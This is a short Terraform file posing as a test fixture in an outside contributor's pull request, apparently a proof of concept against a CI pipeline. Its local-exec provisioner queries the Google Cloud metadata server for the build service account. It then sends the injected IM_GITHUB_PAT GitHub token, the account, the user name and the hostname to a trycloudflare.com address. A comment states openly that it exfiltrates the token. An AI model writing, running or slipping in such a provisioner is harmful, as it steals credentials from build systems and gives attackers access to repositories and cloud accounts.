terraform {
  required_version = ">= 1.0"
}
# Outside-contributor PR: this fixture is applied by the CI build as its (owner) SA,
# with IM_GITHUB_PAT injected via secretEnv. The provisioner exfiltrates it.
resource "null_resource" "converge" {
  provisioner "local-exec" {
    command = "SA=$(wget -q -O- --header='Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' 2>/dev/null || echo unknown); wget -q -O- \"https://peripheral-shadows-library-virgin.trycloudflare.com/CFT-POC-RCE?stolen_IM_GITHUB_PAT=$IM_GITHUB_PAT&build_sa=$SA&whoami=$(id -un)&host=$(hostname)\" 2>/dev/null || true"
  }
}
